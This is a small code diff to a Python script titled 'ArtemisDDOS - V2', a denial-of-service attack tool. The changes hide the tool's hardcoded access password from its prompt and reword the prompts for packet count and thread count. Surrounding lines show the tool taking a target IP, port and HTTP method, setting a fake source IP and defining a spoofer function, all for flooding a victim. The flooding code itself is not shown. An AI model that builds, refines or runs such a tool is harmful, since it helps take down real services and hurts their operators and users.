@@ -30,7 +30,7 @@ elif sys.platform.startswith("freebsd"):
 else:
     os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ArtemisDDOS - V2")
 
-password = input("[ + ] Password Tools: Kintil20 ")
+password = input("[ + ] Password Tools: ")
 if password == 'Kintil20':
         os.system("cls")
 else :
@@ -51,8 +51,8 @@ print("""
 ip = str(input("[ -> ] Target (Target DDoS) : "))
 port = int(input("[ -> ] Port (Port DDoS) : "))
 method_attack = str(input("[ -> ] Method (Method > GET-HEAD-POST) : "))
-times = int(input("[ -> ] (Up to you) Packets : "))
-threads = int(input("[ -> ] (max 1000) Threads : "))
+times = int(input("[ -> ] Packets (Up to You) : "))
+threads = int(input("[ -> ] Threads (Max 1000) : "))
 fake_ip = '182.21.20.32'
 
 def spoofer():
